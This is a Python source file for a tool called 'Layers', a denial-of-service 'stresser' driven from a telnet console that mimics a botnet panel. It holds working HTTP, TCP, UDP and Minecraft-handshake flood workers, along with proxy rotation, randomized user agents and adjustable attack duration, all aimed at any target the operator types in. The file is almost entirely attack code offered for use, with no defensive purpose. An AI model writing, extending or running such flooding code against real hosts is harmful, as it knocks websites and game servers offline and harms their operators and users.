"""
Layers Telnet Server
- Telnet 접속: 127.0.0.1:2323 (PuTTY)
- 명령어: .makebot, attackoption, .attacktime, .setname, .sethost, .http, .tcp, .udp, .minecraft
"""
import socket
import socketserver
import threading as tr
import asyncio
import random
import time
import os
import sys
import struct
import re
from fake_useragent import UserAgent
import aiohttp

# ============ Windows Event Loop ============
IS_WINDOWS = (os.name == "nt")
if IS_WINDOWS:
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

# ============ wcwidth ============
try:
    from wcwidth import wcswidth
    def _w(s):
        v = wcswidth(s)
        return v if v >= 0 else len(s)
except ImportError:
    def _w(s):
        n = 0
        for ch in s:
            o = ord(ch)
            if (0x1100 <= o <= 0x115F or 0x2E80 <= o <= 0xA4CF or
                0xAC00 <= o <= 0xD7A3 or 0xF900 <= o <= 0xFAFF or
                0xFE30 <= o <= 0xFE4F or 0xFF00 <= o <= 0xFF60 or
                0xFFE0 <= o <= 0xFFE6):
                n += 2
            else:
                n += 1
        return n

# ============ Colors ============
PINK1 = "\033[38;2;255;229;241m"
PINK2 = "\033[38;2;255;209;232m"
PINK3 = "\033[38;2;255;184;222m"
PINK4 = "\033[38;2;255;165;216m"
PURP1 = "\033[38;2;245;142;224m"
PURP2 = "\033[38;2;232;165;245m"
PURP3 = "\033[38;2;216;184;240m"
LAV1  = "\033[38;2;200;200;240m"
SKY1  = "\033[38;2;184;216;245m"
SKY2  = "\033[38;2;165;224;245m"
MINT1 = "\033[38;2;184;232;240m"
MINT2 = "\033[38;2;209;240;232m"
RED1  = "\033[38;2;255;140;160m"
RESET = "\033[0m"
BOLD  = "\033[1m"
BORDER = PINK2

CSI   = "\033["
CLEAR = CSI + "2J" + CSI + "H"

_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

# ============ Box helpers ============
def _vw(s): return _w(_ANSI_RE.sub("", s))

def pad(text, width):
    return text + " " * max(0, width - _vw(text))

def compute_w(rows, min_w=40, max_w=110):
    longest = 0
    for label, value in rows:
        longest = max(longest, _w(f" {label}{value}"))
    return max(min_w, min(max_w, longest + 2))

def row(label, value, color, w):
    return f"{BORDER}║{RESET}{color}{pad(f' {label}{value}', w)}{RESET}{BORDER}║{RESET}"

def title_bar(title, w):
    side = (w - _w(title) - 2) // 2
    return f"{BORDER}╔{'═'*side} {title} {'═'*(w-_w(title)-2-side)}╗{RESET}"

def bottom_bar(w):
    return f"{BORDER}╚{'═'*w}╝{RESET}"

def divider(w):
    return f"{BORDER}╠{'═'*w}╣{RESET}"

def grad(text, colors):
    if not text: return ""
    n = len(colors); L = len(text)
    return "".join(
        f"{colors[int(i*(n-1)/max(1,L-1))] if L>1 else colors[0]}{ch}"
        for i, ch in enumerate(text)
    ) + RESET

ART = [
    f"{PINK1}╔  ╔═╗╦ ╦╔═╗╦═╗╔═╗{RESET}",
    f"{PINK3}║  ╠═╣╚╦╝╠═ ╠╦╝╚═╗{RESET}",
    f"{SKY2}╚═╝╩ ╩ ╩ ╚═╝╩╚═╚═╝{RESET}",
]

def set_title(text):
    return f"\033]0;{text}\x07"

# ============ State ============
class State:
    __slots__ = ("bots", "noproxy", "attacktime", "stop", "stats", "stats_lock",
                 "proxy_list", "proxy_idx", "proxy_lock", "running",
                 "users_lock", "clients",
                 # prompt customization
                 "prompt_user", "prompt_host",
                 "user_colors", "host_colors")
    def __init__(self):
        self.bots = 0
        self.noproxy = False
        self.attacktime = 60
        self.stop = tr.Event()
        self.stats = [0, 0, 0]
        self.stats_lock = tr.Lock()
        self.proxy_list = []
        self.proxy_idx = 0
        self.proxy_lock = tr.Lock()
        self.running = False
        self.users_lock = tr.Lock()
        self.clients = {}

        # ── prompt customization ──
        self.prompt_user = "layers"
        self.prompt_host = "root"
        # gradient palettes (list of ANSI color codes)
        self.user_colors = [PINK1, PINK2, PINK3, PINK4, PURP1, PURP2]
        self.host_colors = [MINT1, MINT2, SKY1, SKY2]

S = State()

def build_prompt():
    """Build prompt from S.prompt_user / S.prompt_host with gradients."""
    user_part = grad(S.prompt_user, S.user_colors)
    host_part = grad(S.prompt_host, S.host_colors)
    return user_part + f"{LAV1}@{RESET}" + host_part + f" {PURP3}>{RESET} "

# Pre-computed for quick access (rebuilt on .setname/.sethost)
PROMPT = build_prompt()

RANDOM_PAYLOAD = os.urandom(1024)
UDP_PAYLOADS = [os.urandom(random.randint(64, 1024)) for _ in range(50)]
FLUSH_EVERY = 20

CPU = os.cpu_count() or 4
MAX_WORKERS = CPU * 4

def flush(sent, success, fail):
    if sent == 0 and success == 0 and fail == 0: return
    with S.stats_lock:
        S.stats[0] += sent
        S.stats[1] += success
        S.stats[2] += fail

def next_proxy():
    if not S.proxy_list: return None
    with S.proxy_lock:
        p = S.proxy_list[S.proxy_idx % len(S.proxy_list)]
        S.proxy_idx += 1
        return p

def load_proxies():
    if not os.path.exists("proxy.txt"): return []
    out = []
    with open("proxy.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            if not line.startswith(("http://","https://")):
                line = "http://" + line
            out.append(line)
    return out

_UA_CACHE = []
def ua_pool():
    global _UA_CACHE
    if _UA_CACHE: return _UA_CACHE
    ua = UserAgent()
    s = set()
    while len(s) < 50:
        s.add(ua.random)
    _UA_CACHE = list(s)
    return _UA_CACHE

# ============ User tracking ============
def user_add(cid, addr):
    with S.users_lock:
        S.clients[cid] = {"addr": addr, "start": time.time()}

def user_remove(cid):
    with S.users_lock:
        S.clients.pop(cid, None)

def user_count():
    with S.users_lock:
        return len(S.clients)

def user_list():
    with S.users_lock:
        return [(cid, dict(v)) for cid, v in S.clients.items()]

# ============ Workers ============
async def _http_worker(session, hc, url):
    sent = succ = fail = 0
    use_proxy = (not S.noproxy) and len(S.proxy_list) > 0
    px = next_proxy() if use_proxy else None
    while not S.stop.is_set():
        try:
            h = hc[random.randrange(len(hc))]
            async with session.get(url, headers=h, proxy=px) as r:
                r.release()
                succ += 1
        except asyncio.CancelledError:
            break
        except Exception:
            fail += 1
            if use_proxy: px = next_proxy()
        finally:
            sent += 1
            if sent % FLUSH_EVERY == 0:
                flush(sent, succ, fail); sent = succ = fail = 0
    flush(sent, succ, fail)

def _http_loop(concurrency, url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    pool = ua_pool()
    hc = [{"User-Agent": u} for u in pool[:20]]
    async def main():
        conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=600,
                                    use_dns_cache=True, ssl=False,
                                    force_close=False, enable_cleanup_closed=True,
                                    keepalive_timeout=30)
        to = aiohttp.ClientTimeout(total=5, connect=3)
        async with aiohttp.ClientSession(connector=conn, timeout=to,
                                         auto_decompress=False) as sess:
            tasks = [asyncio.create_task(_http_worker(sess, hc, url))
                     for _ in range(concurrency)]
            while not S.stop.is_set():
                await asyncio.sleep(0.3)
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    try:
        loop.run_until_complete(main())
    finally:
        try:
            for p in asyncio.all_tasks(loop):
                p.cancel()
        except Exception:
            pass
        loop.close()

def _tcp_worker(host, port):
    sent = succ = fail = 0
    pkt = RANDOM_PAYLOAD * 3
    while not S.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(2.0)
            s.connect((host, port))
            try:
                s.sendall(pkt)
                succ += 1
            finally:
                try: s.close()
                except Exception: pass
        except Exception:
            fail += 1
        finally:
            sent += 1
            if sent % FLUSH_EVERY == 0:
                flush(sent, succ, fail); sent = succ = fail = 0
    flush(sent, succ, fail)

def _udp_worker(host, port):
    sent = succ = fail = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    target = (host, port)
    while not S.stop.is_set():
        try:
            for _ in range(8):
                s.sendto(UDP_PAYLOADS[random.randrange(len(UDP_PAYLOADS))], target)
                sent += 1
            succ += 8
            if sent % FLUSH_EVERY == 0:
                flush(sent, succ, fail); sent = succ = fail = 0
        except Exception:
            fail += 1
    flush(sent, succ, fail)

def _mc_varint(v):
    out = b""
    while True:
        b = v & 0x7F; v >>= 7
        if v: out += bytes([b | 0x80])
        else: return out + bytes([b])

def _mc_string(s):
    d = s.encode("utf-8")
    return _mc_varint(len(d)) + d

def _mc_build(host, port, ver=-1):
    p = b""
    p += _mc_varint(0x00)
    p += _mc_varint(ver & 0xFFFFFFFF)
    p += _mc_string(host)
    p += struct.pack(">H", port)
    p += _mc_varint(0x01)
    hs = _mc_varint(len(p)) + p
    return hs + _mc_varint(1) + _mc_varint(0x00)

def _mc_worker(host, port, host_str, wid, pkt, pkt_l):
    sent = succ = fail = 0
    p = pkt if (wid % 2 == 0) else pkt_l
    while not S.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(2.0)
            s.connect((host, port))
            try:
                s.sendall(p)
                try:
                    s.recv(1024); succ += 1
                except socket.timeout: fail += 1
                except Exception: succ += 1
            finally:
                try: s.close()
                except Exception: pass
        except Exception:
            fail += 1
        finally:
            sent += 1
            if sent % FLUSH_EVERY == 0:
                flush(sent, succ, fail); sent = succ = fail = 0
    flush(sent, succ, fail)

# ============ Screen builders ============
def status_bar():
    w = 46
    return [
        title_bar(" Status ", w),
        row("Bots    : ", f"{S.bots}", PINK1, w),
        row("Online  : ", f"{user_count()}", SKY1, w),
        row("Time    : ", f"{S.attacktime}s", MINT1, w),
        row("Options : ", "noproxy" if S.noproxy else "proxy", PURP2, w),
        bottom_bar(w),
    ]

def screen_banner():
    return [""] + ART + [""] + status_bar() + [""]

def screen_help():
    rows = [
        ("help              ", "show help"),
        ("methods           ", "view methods"),
        ("api               ", "view CLI examples"),
        (".makebot <N>      ", "create virtual botnet"),
        ("botinfo           ", "show botnet size"),
        ("users             ", "show online users"),
        ("attackoption k v  ", "noproxy y|n"),
        (".attacktime <sec> ", "set attack duration"),
        (".setname <name>   ", "set prompt user"),
        (".sethost <host>   ", "set prompt host"),
        ("prompt            ", "show current prompt"),
        ("options           ", "show options"),
        ("clear / cls       ", "clear"),
        ("exit / quit       ", "exit"),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Commands", w)]
    L += [row("help              ", "show help", PINK1, w)]
    L += [row("methods           ", "view methods", PINK3, w)]
    L += [row("api               ", "view CLI examples", PINK4, w)]
    L += [divider(w)]
    L += [row(".makebot <N>      ", "create virtual botnet", PURP1, w)]
    L += [row("botinfo           ", "show botnet size", PURP2, w)]
    L += [row("users             ", "show online users", PURP3, w)]
    L += [row("attackoption k v  ", "noproxy y|n", LAV1, w)]
    L += [row(".attacktime <sec> ", "set attack duration (seconds)", SKY1, w)]
    L += [divider(w)]
    L += [row(".setname <name>   ", "set prompt user (default: layers)", MINT1, w)]
    L += [row(".sethost <host>   ", "set prompt host (default: root)", MINT2, w)]
    L += [row("prompt            ", "show current prompt", PURP1, w)]
    L += [row("options           ", "show options", LAV1, w)]
    L += [divider(w)]
    L += [row("clear / cls       ", "clear", SKY2, w)]
    L += [row("exit / quit       ", "exit", RED1, w)]
    L += [bottom_bar(w)]
    return L

def screen_methods():
    rows = [
        (".http      ", "<Thread> <Cons> <Target>"),
        (".tcp       ", "<Thread> <Cons> <Target> <Port>"),
        (".udp       ", "<Thread> <Cons> <Target> <Port>"),
        (".minecraft ", "<Thread> <Cons> <Target> <Port>"),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Methods", w)]
    L += [row(".http      ", "<Thread> <Cons> <Target>", PINK1, w)]
    L += [row(".tcp       ", "<Thread> <Cons> <Target> <Port>", PINK3, w)]
    L += [row(".udp       ", "<Thread> <Cons> <Target> <Port>", PINK4, w)]
    L += [row(".minecraft ", "<Thread> <Cons> <Target> <Port>", PURP2, w)]
    L += [divider(w)]
    L += [row("Duration   ", f"current: {S.attacktime}s (.attacktime <sec>)", SKY1, w)]
    L += [bottom_bar(w)]
    return L

def screen_api():
    rows = [
        ("HTTP : ", "python Layers.py -th 4 -c 50 -s 60 -t URL -m http"),
        ("TCP  : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m tcp"),
        ("UDP  : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m udp"),
        ("MC   : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m minecraft"),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("API (CLI)", w)]
    L += [row("HTTP : ", "python Layers.py -th 4 -c 50 -s 60 -t URL -m http", PINK1, w)]
    L += [row("TCP  : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m tcp", PINK3, w)]
    L += [row("UDP  : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m udp", PINK4, w)]
    L += [row("MC   : ", "python Layers.py -th 4 -c 50 -s 60 -t HOST:PORT -m minecraft", PURP2, w)]
    L += [bottom_bar(w)]
    return L

def screen_options():
    rows = [
        ("noproxy    : ", "y" if S.noproxy else "n"),
        ("attacktime : ", f"{S.attacktime}s"),
        ("prompt user: ", S.prompt_user),
        ("prompt host: ", S.prompt_host),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Options", w)]
    L += [row("noproxy    : ", "y" if S.noproxy else "n", PINK1, w)]
    L += [row("attacktime : ", f"{S.attacktime}s", SKY1, w)]
    L += [row("prompt user: ", S.prompt_user, PURP1, w)]
    L += [row("prompt host: ", S.prompt_host, PURP3, w)]
    L += [bottom_bar(w)]
    return L

def screen_botinfo():
    rows = [("bots : ", str(S.bots))]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Botnet", w)]
    L += [row("bots : ", str(S.bots), PINK1, w)]
    L += [bottom_bar(w)]
    return L

def screen_users():
    users = user_list()
    longest = _w(" # Addr Uptime ")
    entries = []
    now = time.time()
    for i, (cid, info) in enumerate(users, 1):
        addr = info.get("addr", "?")
        up = int(now - info.get("start", now))
        up_s = f"{up//60}m{up%60}s"
        entries.append((i, addr, up_s))
        longest = max(longest, _w(f" {i} {addr} {up_s} "))
    w = max(40, min(110, longest + 4))

    L = screen_banner()
    L += [title_bar("Online Users", w)]
    L += [row("#   ", "Addr                       Uptime", PURP2, w)]
    L += [divider(w)]
    if not entries:
        L += [row("    ", "(no users connected)", LAV1, w)]
    else:
        for i, addr, up_s in entries[:30]:
            L += [row(f"{i:<3} ", f"{addr:<24} {up_s}", SKY1, w)]
        if len(entries) > 30:
            L += [row("    ", f"... +{len(entries)-30} more", PURP2, w)]
    L += [divider(w)]
    L += [row("Total: ", str(len(entries)), MINT1, w)]
    L += [bottom_bar(w)]
    return L

def screen_prompt_preview():
    """Show what the current prompt looks like."""
    current = build_prompt()
    rows = [
        ("user : ", S.prompt_user),
        ("host : ", S.prompt_host),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Prompt Preview", w)]
    L += [row("user : ", S.prompt_user, PINK1, w)]
    L += [row("host : ", S.prompt_host, SKY1, w)]
    L += [divider(w)]
    L += [row("render: ", current, LAV1, w)]
    L += [bottom_bar(w)]
    return L

def screen_attack(method, threads, cons, secs, sent, succ, fail, elapsed):
    rows = [
        ("Method : ", method.upper()),
        ("Thread : ", str(threads)),
        ("Cons   : ", str(cons)),
        ("Time   : ", f"{secs}s"),
        ("Elapsed: ", f"{elapsed:.1f}s"),
        ("Sent   : ", str(sent)),
        ("Success: ", str(succ)),
        ("Errors : ", str(fail)),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Attack Sent", w)]
    L += [row("Method : ", method.upper(), PINK1, w)]
    L += [row("Thread : ", str(threads), PINK3, w)]
    L += [row("Cons   : ", str(cons), PINK4, w)]
    L += [row("Time   : ", f"{secs}s", PURP2, w)]
    L += [row("Elapsed: ", f"{elapsed:.1f}s", LAV1, w)]
    L += [divider(w)]
    L += [row("Sent   : ", str(sent), MINT1, w)]
    L += [row("Success: ", str(succ), SKY1, w)]
    L += [row("Errors : ", str(fail), RED1, w)]
    L += [bottom_bar(w)]
    return L

def screen_final(method, total, sent, succ, fail):
    rows = [
        ("Method  : ", method.upper()),
        ("Duration: ", f"{total:.2f}s"),
        ("Sent    : ", str(sent)),
        ("Success : ", str(succ)),
        ("Fail    : ", str(fail)),
        ("Avg RPS : ", f"{sent/total:.1f}"),
    ]
    w = compute_w(rows)
    L = screen_banner()
    L += [title_bar("Final Result", w)]
    L += [row("Method  : ", method.upper(), PINK1, w)]
    L += [row("Duration: ", f"{total:.2f}s", PINK3, w)]
    L += [row("Sent    : ", str(sent), PINK4, w)]
    L += [row("Success : ", str(succ), PURP2, w)]
    L += [row("Fail    : ", str(fail), PURP3, w)]
    L += [row("Avg RPS : ", f"{sent/total:.1f}", LAV1, w)]
    L += [bottom_bar(w)]
    return L

# ============ Attack ============
def run_attack(out, thread_count, cons_count, target, method, port=None, duration=None):
    if duration is None:
        duration = S.attacktime

    method = method.lower()
    requested = thread_count * cons_count
    workers = max(1, min(requested, MAX_WORKERS))

    http_url = None; host_ip = None; port_num = None; host_str = None

    if method == "http":
        http_url = target
        if not http_url.startswith(("http://","https://")):
            http_url = "http://" + http_url
    else:
        t = target
        if "://" in t: t = t.split("://",1)[1]
        if "/" in t: t = t.split("/",1)[0]
        if port is None:
            if ":" in t:
                host_str, p = t.rsplit(":",1); port_num = int(p)
            else:
                host_str = t; port_num = 25565 if method=="minecraft" else 80
        else:
            host_str = t.rsplit(":",1)[0] if ":" in t else t
            port_num = int(port)
        try: host_ip = socket.gethostbyname(host_str)
        except Exception: host_ip = host_str

    S.proxy_list = []
    if method == "http" and not S.noproxy:
        S.proxy_list = load_proxies()
    S.proxy_idx = 0
    S.stats = [0, 0, 0]
    S.stop.clear()
    S.running = True

    pkt = pkt_l = None
    if method == "minecraft":
        pkt = _mc_build(host_str, port_num)
        pkt_l = _mc_build(host_str, port_num, 0)

    threads = []
    if method == "http":
        loops = min(2, max(1, workers))
        per = max(1, workers // loops)
        for _ in range(loops):
            t = tr.Thread(target=_http_loop, args=(per, http_url), daemon=True)
            t.start()
            threads.append(t)
    else:
        for i in range(workers):
            if method == "tcp":
                t = tr.Thread(target=_tcp_worker, args=(host_ip, port_num), daemon=True)
            elif method == "udp":
                t = tr.Thread(target=_udp_worker, args=(host_ip, port_num), daemon=True)
            else:
                t = tr.Thread(target=_mc_worker,
                              args=(host_ip, port_num, host_str, i+1, pkt, pkt_l),
                              daemon=True)
            t.start()
            threads.append(t)

    def dash():
        start = time.time()
        try:
            while not S.stop.is_set():
                el = time.time() - start
                with S.stats_lock:
                    s, sc, f = S.stats
                frame = "\n".join(screen_attack(method, thread_count, cons_count,
                                                duration, s, sc, f, el))
                try:
                    out.write(set_title(f"{S.prompt_user}@{S.prompt_host} | Bots: {S.bots} | Online: {user_count()}"))
                    out.write(CLEAR + frame + "\n")
                    out.flush()
                except Exception:
                    pass
                time.sleep(0.5)
        except Exception:
            pass

    dash_t = tr.Thread(target=dash, daemon=True)
    dash_t.start()

    start = time.time()
    try:
        while time.time() - start < duration:
            if S.stop.is_set(): break
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        S.stop.set()
        S.running = False

    time.sleep(0.5)
    total = time.time() - start
    with S.stats_lock:
        s, sc, f = S.stats

    frame = "\n".join(screen_final(method, total, s, sc, f))
    try:
        out.write(set_title(f"{S.prompt_user}@{S.prompt_host} | Bots: {S.bots} | Online: {user_count()}"))
        out.write(CLEAR + frame + "\n")
        out.flush()
    except Exception:
        pass

# ============ Command dispatcher ============
def handle(line, out):
    global PROMPT
    parts = line.strip().split()
    if not parts: return True
    cmd = parts[0].lower()
    rest = parts[1:]

    def show(lines):
        try:
            out.write(set_title(f"{S.prompt_user}@{S.prompt_host} | Bots: {S.bots} | Online: {user_count()}"))
            out.write(CLEAR + "\n".join(lines) + "\n")
            out.flush()
        except Exception:
            pass

    if cmd in ("exit","quit"):
        return False
    if cmd in ("clear","cls"):
        show(screen_banner())
    elif cmd == "help":
        show(screen_help())
    elif cmd == "methods":
        show(screen_methods())
    elif cmd == "api":
        show(screen_api())
    elif cmd == "options":
        show(screen_options())
    elif cmd == "botinfo":
        show(screen_botinfo())
    elif cmd == "users":
        show(screen_users())
    elif cmd == "prompt":
        show(screen_prompt_preview())
    elif cmd in ("makebot",".makebot"):
        if len(rest) != 1:
            show([f"{RED1}Usage: .makebot <count>{RESET}"])
        else:
            try:
                n = int(rest[0])
                if n < 0: raise ValueError
                S.bots = n
                show(screen_botinfo())
            except ValueError:
                show([f"{RED1}Invalid count.{RESET}"])
    elif cmd == "attackoption":
        if len(rest) != 2:
            show([f"{RED1}Usage: attackoption <k> <v>  (noproxy y|n){RESET}"])
        else:
            k, v = rest[0].lower(), rest[1].lower()
            if k == "noproxy":
                S.noproxy = (v == "y")
                show(screen_options())
            else:
                show([f"{RED1}Unknown option: {k}{RESET}"])
    elif cmd == ".attacktime":
        if len(rest) != 1:
            show([f"{RED1}Usage: .attacktime <seconds>{RESET}"])
        else:
            try:
                n = int(rest[0])
                if n <= 0: raise ValueError
                S.attacktime = n
                show(screen_options())
            except ValueError:
                show([f"{RED1}Invalid seconds (must be > 0).{RESET}"])
    elif cmd == ".setname":
        # ★ prompt user (before @)
        if len(rest) != 1:
            show([f"{RED1}Usage: .setname <name>{RESET}"])
        else:
            S.prompt_user = rest[0]
            PROMPT = build_prompt()
            show(screen_prompt_preview())
    elif cmd == ".sethost":
        # ★ prompt host (after @)
        if len(rest) != 1:
            show([f"{RED1}Usage: .sethost <host>{RESET}"])
        else:
            S.prompt_host = rest[0]
            PROMPT = build_prompt()
            show(screen_prompt_preview())
    elif cmd == ".http":
        if len(rest) != 3:
            show([f"{RED1}Usage: .http <Thread> <Cons> <Target>{RESET}"])
        else:
            try:
                th, cs = int(rest[0]), int(rest[1])
                run_attack(out, th, cs, rest[2], "http", None)
            except ValueError:
                show([f"{RED1}Thread/Cons must be integers.{RESET}"])
    elif cmd in (".tcp",".udp",".minecraft"):
        if len(rest) != 4:
            show([f"{RED1}Usage: {cmd} <Thread> <Cons> <Target> <Port>{RESET}"])
        else:
            try:
                th, cs, pt = int(rest[0]), int(rest[1]), int(rest[3])
                run_attack(out, th, cs, rest[2], cmd[1:], pt)
            except ValueError:
                show([f"{RED1}Thread/Cons/Port must be integers.{RESET}"])
    else:
        show([f"{RED1}Unknown command: {cmd}{RESET}"])
    return True

# ============ Telnet Server ============
IAC  = 0xFF
DONT = 0xFE
DO   = 0xFD
WONT = 0xFC
WILL = 0xFB
SB   = 0xFA
SE   = 0xF0

class _TelnetWriter:
    def __init__(self, handler): self.handler = handler
    def write(self, s): self.handler.send_str(s)
    def flush(self): pass

class TelnetHandler(socketserver.BaseRequestHandler):
    def send_str(self, s):
        s = s.replace("\r\n", "\n").replace("\n", "\r\n")
        try:
            self.request.sendall(s.encode("utf-8", "ignore"))
        except Exception:
            pass

    def _read_line(self):
        buf = bytearray()
        in_iac = False
        while True:
            try:
                ch = self.request.recv(1)
            except Exception:
                return None
            if not ch: return None
            b = ch[0]
            if in_iac:
                if b in (DO, DONT, WILL, WONT):
                    try: self.request.recv(1)
                    except Exception: pass
                elif b == SB:
                    while True:
                        try:
                            c = self.request.recv(1)
                            if not c or c[0] == SE: break
                        except Exception: break
                in_iac = False
                continue
            if b == IAC:
                in_iac = True
                continue
            if b == 0x0D: continue
            if b == 0x0A:
                return buf.decode("utf-8", "ignore")
            if b in (0x08, 0x7F):
                if buf:
                    buf.pop()
                    self.send_str("\b \b")
                continue
            if b == 0x03:
                self.send_str("^C\n"); return ""
            buf.append(b)
            try:
                self.request.sendall(bytes([b]))
            except Exception:
                return None

    def handle(self):
        cid = id(self.request)
        peer = self.client_address
        user_add(cid, f"{peer[0]}:{peer[1]}")
        try:
            self.request.settimeout(None)
            for opt in (1, 3, 24, 31, 32, 33, 34, 39):
                try:
                    self.request.sendall(bytes([IAC, WONT, opt]))
                    self.request.sendall(bytes([IAC, DONT, opt]))
                except Exception: pass
            self.send_str(set_title(f"{S.prompt_user}@{S.prompt_host} | Bots: {S.bots} | Online: {user_count()}"))
            self.send_str(CLEAR)
            self.send_str("\n".join(screen_banner()) + "\n")
            writer = _TelnetWriter(self)
            while True:
                self.send_str(set_title(f"{S.prompt_user}@{S.prompt_host} | Bots: {S.bots} | Online: {user_count()}"))
                self.send_str(PROMPT)
                line = self._read_line()
                if line is None: break
                self.send_str("\n")
                if not handle(line, writer):
                    self.send_str(f"{MINT2}Bye.{RESET}\n"); break
        except Exception:
            pass
        finally:
            user_remove(cid)
            try: self.request.close()
            except Exception: pass

class ThreadedTelnetServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

def start_telnet(host="127.0.0.1", port=2323):
    server = ThreadedTelnetServer((host, port), TelnetHandler)
    print(f"{MINT1}[Telnet] listening on {host}:{port}{RESET}")
    print(f"{LAV1}Use PuTTY -> Raw/Telnet -> {host}:{port}{RESET}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{RED1}[Telnet] shutdown{RESET}")
        server.shutdown()

# ============ Entry ============
if __name__ == "__main__":
    port = 2323
    for i, a in enumerate(sys.argv):
        if a in ("-p", "--port") and i+1 < len(sys.argv):
            port = int(sys.argv[i+1])
    try:
        start_telnet("127.0.0.1", port)
    except OSError as e:
        print(f"{RED1}[!] Port {port} busy: {e}{RESET}")
        print(f"{LAV1}Try: python Layers.py -p 2324{RESET}")
